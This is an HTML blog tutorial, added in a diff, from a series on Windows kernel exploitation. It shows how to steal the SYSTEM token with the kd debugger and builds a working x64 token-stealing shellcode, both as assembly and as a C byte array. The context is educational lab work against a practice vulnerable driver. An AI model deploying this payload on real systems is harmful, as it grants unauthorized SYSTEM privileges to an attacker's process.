@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+
+  <title>A Primer to Windows x64 shellcoding</title>
+
+  
+
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="referrer" content="origin" />
+  <meta name="generator" content="Pelican" />
+<link href="https://blahcat.github.io/posts/2017/08/14/a-primer-to-windows-x64-shellcoding.html" rel="canonical" />
+  <!-- Feed -->
+        <link href="https://blahcat.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Full Atom Feed" />
+          <link href="https://blahcat.github.io/feeds/{slug}.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Categories Atom Feed" />
+
+  <link href="https://blahcat.github.io/theme/css/style.css" type="text/css" rel="stylesheet" />
+
+  <!-- Code highlight color scheme -->
+      <link href="https://blahcat.github.io/theme/css/code_blocks/github.css" rel="stylesheet">
+
+    <!-- CSS specified by the user -->
+
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://blahcat.github.io/assets/css/overrides.css" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css" rel="stylesheet" />
+
+  <!-- Custom fonts -->
+  <link href='https://fonts.googleapis.com/css?family=Montserrat:400,300' rel='stylesheet' type='text/css' />
+  <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet" type="text/css" />
+
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+
+
+
+    <meta name="description" content="Continuing on the path to Windows kernel exploitation... Thanks to the previous post, we now have a working lab for easily (and in a...">
+
+    <meta name="author" content="hugsy">
+
+    <meta name="tags" content="windows">
+    <meta name="tags" content="kernel">
+    <meta name="tags" content="debugging">
+    <meta name="tags" content="pwn">
+    <meta name="tags" content="token">
+    <meta name="tags" content="shellcode">
+
+
+
+
+<!-- Open Graph -->
+<meta prefix="og: http://ogp.me/ns#" property="og:site_name" content="BlahCats"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:title" content="A Primer to Windows x64 shellcoding"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:description" content="Continuing on the path to Windows kernel exploitation... Thanks to the previous post, we now have a working lab for easily (and in a..."/>
+<meta prefix="og: http://ogp.me/ns#" property="og:locale" content="en_US"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:url" content="https://blahcat.github.io/posts/2017/08/14/a-primer-to-windows-x64-shellcoding.html"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:type" content="article"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:published_time" content="2017-08-14 00:00:00-07:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:modified_time" content="2017-08-14 00:00:00-07:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:author" content="https://blahcat.github.io/author/hugsy">
+<meta prefix="og: http://ogp.me/ns#" property="article:section" content="tutorial"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="windows"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="kernel"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="debugging"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="pwn"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="token"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="shellcode"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:image" content="https://blahcat.github.io/assets/images/win-kernel-debug/bg.png">
+
+<!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@ctf_blahcat">
+    <meta name="twitter:title" content="A Primer to Windows x64 shellcoding">
+    <meta name="twitter:url" content="https://blahcat.github.io/posts/2017/08/14/a-primer-to-windows-x64-shellcoding.html">
+
+        <meta name="twitter:image:src" content="https://blahcat.github.io/assets/images/win-kernel-debug/bg.png">
+
+      <meta name="twitter:description" content="Continuing on the path to Windows kernel exploitation... Thanks to the previous post, we now have a working lab for easily (and in a...">
+
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "name": "A Primer to Windows x64 shellcoding",
+  "headline": "A Primer to Windows x64 shellcoding",
+  "datePublished": "2017-08-14 00:00:00-07:00",
+  "dateModified": "2017-08-14 00:00:00-07:00",
+  "author": {
+    "@type": "Person",
+    "name": "hugsy",
+    "url": "https://blahcat.github.io/author/hugsy"
+  },
+  "image": "https://blahcat.github.io/assets/images/win-kernel-debug/bg.png",
+  "url": "https://blahcat.github.io/posts/2017/08/14/a-primer-to-windows-x64-shellcoding.html",
+  "description": "Continuing on the path to Windows kernel exploitation... Thanks to the previous post, we now have a working lab for easily (and in a..."
+}
+</script>
+</head>
+<!-- TODO : Body class -->
+<body class="home-template">
+
+<nav id="menu">
+  <a class="close-button">Close</a>
+  <div class="nav-wrapper">
+    <p class="nav-label">Menu</p>
+    <ul>
+          <li><a href="/pages/about.html" role="presentation">About</a></li>
+          <li><a href="/categories/" role="presentation">Browse By Category</a></li>
+          <li><a href="/tags/" role="presentation">Browse By Tag</a></li>
+          <li><a href="/pages/qemu-vm-repo" role="presentation">Qemu VMs</a></li>
+          <li><a href="/pages/exploitation-series" role="presentation">Exploitation Tutorials</a></li>
+          <li><a href="/pages/notes" role="presentation">Misc Notes</a></li>
+          <li><a href="/feeds/all.atom.xml" role="presentation">RSS Feed</a></li>
+
+
+    </ul>
+  </div>
+</nav>
+    <!-- Progressbar -->
+    <div class="progress-container">
+        <span class="progress-bar"></span>
+    </div>
+
+    <!-- Page Header -->
+    <!-- Set your background image for this header on the line below. -->
+    <header id="post-header" class="has-cover">
+      <div class="inner">
+        <nav id="navigation">
+            <span id="home-button" class="nav-button">
+                <a class="home-button" href="https://blahcat.github.io/" title="Home"><i class="ic ic-arrow-left"></i> Home</a>
+            </span>
+          <span id="menu-button" class="nav-button">
+            <a class="menu-button"><i class="ic ic-menu"></i> Menu</a>
+          </span>
+        </nav>
+        <h1 class="post-title">A Primer to Windows x64 shellcoding</h1>
+        <!-- TODO : Proper class for headline -->
+        <span class="post-meta">
+                <a href="https://blahcat.github.io/author/hugsy">hugsy</a>
+            <br>
+              Posted on <time style="font-weight: bold">14 Aug 2017</time>
+          </span>
+
+            <div class="post-cover cover" style="background-image: url('https://blahcat.github.io/assets/images/win-kernel-debug/bg.png')">
+      </div>
+    </header>
+
+  <section id="wrapper">
+    <a class="hidden-close"></a>
+
+    <!-- Post content -->
+    <main class="content" role="main">
+        <article class="post">
+        <div class="inner">
+            <section class="post-content">
+                <p>Continuing on the path to Windows kernel exploitation...</p>
+<p>Thanks to the previous post, we now have a working lab for easily (and
+in a reasonably fast manner) debug Windows kernel.</p>
+<p>Let's skip ahead for a minute and assume we control PC using some vulnerability
+in kernel land (next post), then we may want to jump back into a user allocated
+buffer to execute a control shellcode. So where do we go from now? How to
+transform this controlled PC in the kernel-land into a privileged process in
+user-land?</p>
+<p>The classic technique is to steal the <code>System</code> process token and copy it into the
+structure of our targeted arbitrary (but unprivileged) process (say <code>cmd.exe</code>).</p>
+<div class="alert-info"><i class="fa fa-info-circle">&nbsp;Note:</i><br>
+Our target here will the Modern.IE Windows 8.1 x64 we created in the <a href="/2017/08/07/setting-up-a-windows-vm-lab-for-kernel-debugging">previous post</a>, that we'll interact with using <code>kd</code> via Network debugging. Refer to previous post if you need to set it up.
+</div>
+<h1>Stealing SYSTEM token using <code>kd</code></h1>
+<p>The
+<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-process"><code>!process</code></a> extension
+of WinDBG provides a structured display of one or all the processes.</p>
+<div class="highlight"><pre><span></span><code>kd&gt; !process 0 0 System
+PROCESS ffffe000baa6c040
+   SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
+   DirBase: 001a7000  ObjectTable: ffffc0002f403000  HandleCount: &lt;Data Not Accessible&gt;
+   Image: System
+</code></pre></div>
+
+<p>This leaks the address of the <code>_EPROCESS</code> structure in the kernel, of the proces
+named <code>System</code>. Using <code>dt</code> will provide a lot more info (here, massively
+truncated to what interests us):</p>
+<div class="highlight"><pre><span></span><code>kd&gt; dt _EPROCESS ffffe000baa6c040
+ntdll!_EPROCESS
+   +0x000 Pcb              : _KPROCESS
+   [...]
+   +0x2e0 UniqueProcessId  : 0x00000000`00000004 Void
+   +0x2e8 ActiveProcessLinks : _LIST_ENTRY [ 0xffffe000`bbc54be8 - 0xfffff801`fed220a0 ]
+   [...]
+   +0x348 Token            : _EX_FAST_REF
+   [...]
+   +0x430 PageDirectoryPte : 0
+   +0x438 ImageFileName    : [15]  &quot;System&quot;
+</code></pre></div>
+
+<p>At <code>nt!_EPROCESS.Token</code> (+0x348) we get the process token, which holds a pointer to an
+<a href="https://git.reactos.org/?p=reactos.git;a=blob;f=reactos/sdk/include/ndk/extypes.h;h=feaf7b95df50f7a9d95108882a2cdd71263a675b;hb=HEAD#l418">"Executive Fast Reference" structure</a>.</p>
+<div class="highlight"><pre><span></span><code>kd&gt; dt nt!_EX_FAST_REF ffffe000baa6c040+348
+   +0x000 Object           : 0xffffc000`2f405598 Void
+   +0x000 RefCnt           : 0y1000
+   +0x000 Value            : 0xffffc000`2f405598
+</code></pre></div>
+
+<p>If we nullify the last nibble of the address (i.e. AND with -0xf on x64, -7 on
+x86), we end up having the <code>System</code> token's address:</p>
+<div class="highlight"><pre><span></span><code>kd&gt; ? 0xffffc000`2f405598 &amp; -f
+Evaluate expression: -70367951432304 = ffffc000`2f405590
+
+kd&gt; dt nt!_TOKEN ffffc000`2f405590
+    +0x000 TokenSource      : _TOKEN_SOURCE
+    +0x010 TokenId          : _LUID
+    +0x018 AuthenticationId : _LUID
+    +0x020 ParentTokenId    : _LUID
+    +0x028 ExpirationTime   : _LARGE_INTEGER 0x06207526`b64ceb90
+    +0x030 TokenLock        : 0xffffe000`baa4ef90 _ERESOURCE
+    +0x038 ModifiedId       : _LUID
+    +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
+    +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
+    [...]
+</code></pre></div>
+
+<div class="alert-info"><i class="fa fa-info-circle">&nbsp;Note:</i> the WinDBG extension <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-token"><code>!token</code></a> provides a more detailed (and parsed) output. You might to refer to it instead whenever  you are analyzing tokens.</div>
+<p>So basically, if we create a process (say <code>cmd.exe</code>), and overwrite its token with the <code>System</code> token value we found (0xffffc0002f405590), our process will be running as <code>System</code>. Let's try!</p>
+<p><img alt="image_alt" src="/assets/images/win-kernel-debug/token-bump-via-windbg-1.png"></p>
+<p>We search our process using <code>kd</code>:</p>
+<div class="highlight"><pre><span></span><code>kd&gt; !process 0 0 cmd.exe
+PROCESS ffffe000babfd900
+    SessionId: 1  Cid: 09fc    Peb: 7ff6fa81c000  ParentCid: 0714
+    DirBase: 45c4c000  ObjectTable: ffffc00036d03940  HandleCount: &lt;Data Not  Accessible&gt;
+    Image: cmd.exe
+</code></pre></div>
+
+<p>Overwrite the offset 0x348 with the <code>SYSTEM</code> token pointer (0xffffc0002f405590).</p>
+<div class="highlight"><pre><span></span><code>kd&gt; dq ffffe000bc043900+348 l1
+ffffe000`bc043c48  ffffc000`30723426
+kd&gt; eq 0xffffe000babfd900+0x348 0xffffc0002f405590
+</code></pre></div>
+
+<p>And tada ...</p>
+<p><img alt="image_alt" src="/assets/images/win-kernel-debug/token-bump-via-windbg-2.png"></p>
+<p>Now we know how to transform any unprivileged process into a privileged one
+using <code>kd</code>.</p>
+<h1>Shellcoding our way to SYSTEM</h1>
+<p>So the basic idea now, to reproduce the same steps that we did in the last
+part, but from our shellcode. So we need:</p>
+<ol>
+<li>A pointer to <code>System</code> <code>EPROCESS</code> structure, and save the token (located
+    at offset +0x348)</li>
+<li>Look up for the current process <code>EPROCESS</code> structure</li>
+<li>Overwrite its token with <code>System</code>'s</li>
+<li>Profit!</li>
+</ol>
+<h2>Getting the current process structure address</h2>
+<p>Pointers to process structures on Windows are stored in a doubly linked list (see the
+member <code>ActiveProcessLinks</code> of <code>nt!_EPROCESS</code> in <code>kd</code>).
+If we have the address to one process, we can "scroll" back and forward to discover the
+others. But first, we need to get the address of at the least one process in the
+kernel.</p>
+<p>This is exactly the purpose of the routine <code>nt!PsGetCurrentProcess</code>, but
+since we can't call it directly (thank you ASLR), we can still check what is it
+doing under the hood:</p>
+<div class="highlight"><pre><span></span><code>kd&gt; uf nt!PsGetCurrentProcess
+nt!PsGetCurrentProcess:
+fffff801`feb06e84 65488b042588010000   mov   rax,qword ptr gs:[188h]
+fffff801`feb06e8d 488b80b8000000       mov   rax,qword ptr [rax+0B8h]
+fffff801`feb06e94 c3                   ret
+
+kd&gt; dps gs:188 l1
+002b:00000000`00000188  fffff801`fedbfa00 nt!KiInitialThread
+</code></pre></div>
+
+<p><code>mov rax, qword ptr gs:[188h]</code> returns a pointer to an <code>_ETHREAD</code> structure (more
+specifically the kernel thread (KTHREAD) <code>nt!KiInitialThread</code>). If we check the content of
+this structure at the offset 0xb8, we find the structure to the current process:</p>
+<div class="highlight"><pre><span></span><code>kd&gt; dt nt!_EPROCESS poi(nt!KiInitialThread+b8)
+   +0x000 Pcb              : _KPROCESS
+   [...]
+   +0x2e0 UniqueProcessId  : 0x00000000`00000004 Void
+   +0x2e8 ActiveProcessLinks : _LIST_ENTRY [ 0xffffe000`bbc54be8 - 0xfffff801`fed220a0 ]
+   [...]
+   +0x348 Token            : _EX_FAST_REF
+</code></pre></div>
+
+<p>So now we know where our current process resides in the kernel (just like <code>kd</code>
+gave us using <code>!process 0 0 cmd.exe</code> earlier), and therefore the first of our
+shellcode:</p>
+<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="no">gs</span><span class="p">:</span><span class="mi">0x188</span>
+<span class="w">  </span><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rax</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0xb8</span><span class="p">]</span>
+</code></pre></div>
+
+<h2>Browsing through the process list to reach <code>System</code></h2>
+<p>The processes are stored in the <code>ActiveProcessLinks</code> (offset 0x2e8) of the
+<code>nt!_EPROCESS</code> structure, via a <code>_LIST_ENTRY</code>, which is a doubly linked list in
+its simplest form:</p>
+<div class="highlight"><pre><span></span><code>kd&gt; dt _LIST_ENTRY
+ntdll!_LIST_ENTRY
+   +0x000 Flink            : Ptr64 _LIST_ENTRY
+   +0x008 Blink            : Ptr64 _LIST_ENTRY
+</code></pre></div>
+
+<p>Since we know that <code>System</code> process ID is 4, we can write a very small loop in
+assembly, whose pseudo-C code would be:</p>
+<div class="highlight"><pre><span></span><code><span class="n">ptrProcess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">curProcess</span>
+<span class="k">while</span><span class="w"> </span><span class="n">ptrProcess</span><span class="o">-&gt;</span><span class="n">UniqueProcessId</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">SystemProcess</span><span class="o">-&gt;</span><span class="n">UniqueProcessId</span><span class="w"> </span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">ptrProcess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptrProcess</span><span class="o">-&gt;</span><span class="n">Flink</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Which builds the second part of our shellcode:</p>
+<div class="highlight"><pre><span></span><code><span class="c1">;; rax has the pointer to the current KPROCESS</span>
+<span class="nf">mov</span><span class="w"> </span><span class="no">rbx</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span>
+
+<span class="nl">__loop:</span>
+<span class="nf">mov</span><span class="w"> </span><span class="no">rbx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rbx</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0x2e8</span><span class="p">]</span><span class="w"> </span><span class="c1">;; +0x2e8  ActiveProcessLinks[0].Flink</span>
+<span class="nf">sub</span><span class="w"> </span><span class="no">rbx</span><span class="p">,</span><span class="w"> </span><span class="mi">0x2e8</span><span class="w"> </span><span class="c1">;; nextProcess</span>
+<span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rbx</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0x2e0</span><span class="p">]</span><span class="w"> </span><span class="c1">;; +0x2e0  UniqueProcessId</span>
+<span class="nf">cmp</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="c1">;; compare to target PID</span>
+<span class="nf">jnz</span><span class="w"> </span><span class="no">__loop</span>
+
+<span class="c1">;; here rbx hold a pointer to System structure</span>
+</code></pre></div>
+
+<h2>Overwrite the current process token field with <code>System</code>'s</h2>
+<p>This is the third and final part of our shellcode, and the easiest since
+everything was done in the steps above:</p>
+<div class="highlight"><pre><span></span><code><span class="c1">;; rax has the pointer to the current KPROCESS</span>
+<span class="c1">;; rbx has the pointer to System KPROCESS</span>
+
+<span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rbx</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0x348</span><span class="p">]</span><span class="w"> </span><span class="c1">;; +0x348  Token</span>
+<span class="nf">and</span><span class="w"> </span><span class="no">cl</span><span class="p">,</span><span class="w"> </span><span class="mi">0xf0</span><span class="w"> </span><span class="c1">;; we must clear the lowest nibble</span>
+<span class="nf">mov</span><span class="w"> </span><span class="p">[</span><span class="no">rax</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0x348</span><span class="p">],</span><span class="w"> </span><span class="no">rcx</span>
+</code></pre></div>
+
+<h1>The final shellcode</h1>
+<p>We add a few extra instructions to correctly save and restore the context, and
+make sure we exit cleanly:</p>
+<script src="https://gist.github.com/hugsy/763ec9e579796c35411a5929ae2aca27.js"></script>
+
+<p>We can now simply use any assembler (NASM, YASM) - but I have a personal preference for <a href="http://keystone-engine.org">Keystone-Engine</a> - to generate a bytecode version of our shellcode.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#define LEN 80</span>
+
+<span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">sc</span><span class="p">[</span><span class="n">LEN</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;&quot;</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\x50</span><span class="s">&quot;</span><span class="w">                                             </span><span class="c1">// push rax</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\x53</span><span class="s">&quot;</span><span class="w">                                             </span><span class="c1">// push rbx</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\x51</span><span class="s">&quot;</span><span class="w">                                             </span><span class="c1">// push rcx</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\x48\x65\xa1\x88\x01\x00\x00\x00\x00\x00\x00</span><span class="s">&quot;</span><span class="w">     </span><span class="c1">// mov rax, gs:0x188</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\x48\x8b\x80\xb8\x00\x00\x00</span><span class="s">&quot;</span><span class="w">                     </span><span class="c1">// mov rax, [rax+0xb8]</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\x48\x89\xc3</span><span class="s">&quot;</span><span class="w">                                     </span><span class="c1">// mov rbx, rax</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\x48\x8b\x9b\xe8\x02\x00\x00</span><span class="s">&quot;</span><span class="w">                     </span><span class="c1">// mov rbx, [rbx+0x2e8]</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\x48\x81\xeb\xe8\x02\x00\x00</span><span class="s">&quot;</span><span class="w">                     </span><span class="c1">// sub rbx, 0x2e8</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\x48\x8b\x8b\xe0\x02\x00\x00</span><span class="s">&quot;</span><span class="w">                     </span><span class="c1">// mov rcx, [rbx+0x2e0]</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\x48\x83\xf9\x04</span><span class="s">&quot;</span><span class="w">                                 </span><span class="c1">// cmp rcx, 4</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\x75\x15</span><span class="s">&quot;</span><span class="w">                                         </span><span class="c1">// jnz 0x17</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\x48\x8b\x8b\x48\x03\x00\x00</span><span class="s">&quot;</span><span class="w">                     </span><span class="c1">// mov rcx, [rbx + 0x348]</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\x48\x89\x88\x48\x03\x00\x00</span><span class="s">&quot;</span><span class="w">                     </span><span class="c1">// mov [rax + 0x348], rcx</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\x59</span><span class="s">&quot;</span><span class="w">                                             </span><span class="c1">// pop rcx</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\x5b</span><span class="s">&quot;</span><span class="w">                                             </span><span class="c1">// pop rbx</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\x58</span><span class="s">&quot;</span><span class="w">                                             </span><span class="c1">// pop rax</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\x58\x58\x58\x58\x58</span><span class="s">&quot;</span><span class="w">                             </span><span class="c1">// pop rax; pop rax; pop rax; pop rax; pop rax; (required for proper stack return)</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\x48\x31\xc0</span><span class="s">&quot;</span><span class="w">                                     </span><span class="c1">// xor rax, rax  (i.e. NT_SUCCESS)</span>
+<span class="w">  </span><span class="s">&quot;</span><span class="se">\xc3</span><span class="s">&quot;</span><span class="w">                                             </span><span class="c1">// ret</span>
+<span class="w">  </span><span class="s">&quot;&quot;</span><span class="p">;</span>
+</code></pre></div>
+
+<p>Once copied into an executable location, this shellcode will grant the current
+process with all <code>System</code> privileges.</p>
+<p>The next post will actually use this newly created shellcode in a concrete vulnerability exploitation (from the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">Extremely Vulnerable Driver</a> by HackSys Team.</p>
+<p>Until then, take care!</p>
+<h1>Recommended readings</h1>
+<ol>
+<li><a href="https://www.amazon.com/Guide-Kernel-Exploitation-Attacking-Core/dp/1597494860">A Guide to Kernel Exploitation - Attacking The Core</a></li>
+<li><a href="https://securitycafe.ro/2015/10/30/introduction-to-windows-shellcode-development-part1/">Introduction To Windows Shellcode Development</a></li>
+<li><a href="https://mcdcyber.wordpress.com/2011/03/07/x64-kernel-privilege-escalation/">x64 Kernel Privilege Escalation</a></li>
+<li><a href="https://support.microsoft.com/en-ca/help/243330/well-known-security-identifiers-in-windows-operating-systems">Well-Known Security IDentifiers</a></li>
+<li><a href="http://hick.org/code/skape/papers/win32-shellcode.pdf">Understanding Windows Shellcode</a></li>
+</ol>
+            </section>
+
+
+            <section class="post-info">
+                <div class="post-share">
+                    <a class="twitter" href="https://twitter.com/share?text=A Primer to Windows x64 shellcoding&amp;url=https://blahcat.github.io/posts/2017/08/14/a-primer-to-windows-x64-shellcoding.html" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <i class="ic ic-twitter"></i><span class="hidden">Twitter</span>
+                    </a>
+                    <a class="facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://blahcat.github.io/posts/2017/08/14/a-primer-to-windows-x64-shellcoding.html" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <i class="ic ic-facebook"></i><span class="hidden">Facebook</span>
+                    </a>
+                    <a class="googleplus" href="https://plus.google.com/share?url=https://blahcat.github.io/posts/2017/08/14/a-primer-to-windows-x64-shellcoding.html" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <i class="ic ic-googleplus"></i><span class="hidden">Google+</span>
+                    </a>
+                    <div class="clear"></div>
+                </div>
+
+                
+              
+                <aside class="post-tags">
+<a href="https://blahcat.github.io/tag/windows">windows</a><a href="https://blahcat.github.io/tag/kernel">kernel</a><a href="https://blahcat.github.io/tag/debugging">debugging</a><a href="https://blahcat.github.io/tag/pwn">pwn</a><a href="https://blahcat.github.io/tag/token">token</a><a href="https://blahcat.github.io/tag/shellcode">shellcode</a>                </aside>
+              
+               <a title="Category" style="font-weight: bold;" class="category_link" href="https://blahcat.github.io/category/tutorial">tutorial</a>
+
+                <div class="clear"></div>
+
+                <aside class="post-discussions">
+                    <div id="discussion_thread">
+                      Continue the discussion on
+                      <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=A Primer to Windows x64 shellcoding">
+                        <i class="fa fa-github fa-lg"></i>
+                        GitHub
+                      </a>
+                      <div class="clear"></div>
+                    </div>
+                  </aside>
+
+
+                <aside class="post-author">
+
+
+                        <figure class="post-author-avatar">
+                            <img src="https://blahcat.github.io/assets/images/authors/hugsy.png" alt="hugsy" />
+                        </figure>
+                    <div class="post-author-bio">
+                        <h4 class="post-author-name"><a href="https://blahcat.github.io/author/hugsy">hugsy</a></h4>
+                            <p class="post-author-about">BWAAAAHHHH</p>
+                            <span class="post-author-website"><a href="/author/hugsy"><i class="ic ic-link"></i> Website</a></span>
+                        <!-- Social linkes in alphabet order. -->
+                            <span class="post-author-github"><a target="_blank" href="https://github.com/hugsy"><i class="ic ic-link"></i> GitHub</a></span>
+                            <span class="post-author-twitter"><a target="_blank" href="https://twitter.com/_hugsy_"><i class="ic ic-twitter"></i> Twitter</a></span>
+                    </div>
+                    <div class="clear"></div>
+                </aside>
+
+                </section>
+
+                <aside class="post-nav">
+                    <a class="post-nav-next" href="https://blahcat.github.io/posts/2017/08/18/first-exploit-in-windows-kernel-hevd.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-left"></i>
+                                <h2 class="post-nav-title">First exploit in Windows Kernel (HEVD)</h2>
+                            <p class="post-nav-excerpt">Hi there ✋ This post is the third chapter of this series, where we dive into Windows...</p>
+                        </section>
+                    </a>
+                    <a class="post-nav-prev" href="https://blahcat.github.io/posts/2017/08/07/setting-up-a-windows-vm-lab-for-kernel-debugging.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-right"></i>
+                                <h2 class="post-nav-title">Setting up a Windows VM lab for kernel debugging</h2>
+                            <p class="post-nav-excerpt">This is the first on a series of posts on Windows kernel debugging and exploitation....</p>
+                        </section>
+                    </a>
+                    <div class="clear"></div>
+                </aside>
+
+            </div>
+        </article>
+    </main>
+      <!-- TODO : Body class -->
+    <div id="body-class" style="display: none;" class=""></div>
+
+    <footer id="footer">
+      <div class="inner">
+        <section class="credits">
+          <span class="credits-theme"><a class="fa fa-twitter fa-3x" href="https://twitter.com/ctf_blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-github fa-3x" href="https://github.com/blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-youtube fa-3x" href="https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg" target="_blank"></a></span>
+          <span class="credits-software">Powered by <a href="https://github.com/getpelican/pelican" rel="nofollow">Pelican</a> and <a href="https://github.com/arulrajnet/attila" rel="nofollow">Attila</a> theme</span>
+        </section>
+      </div>
+    </footer>
+  </section>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+  <script type="text/javascript" src="https://blahcat.github.io/theme/js/script.js"></script>
+
+    <!-- Script specified by the user -->
+    <script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js"></script>
+</body>
+</html>
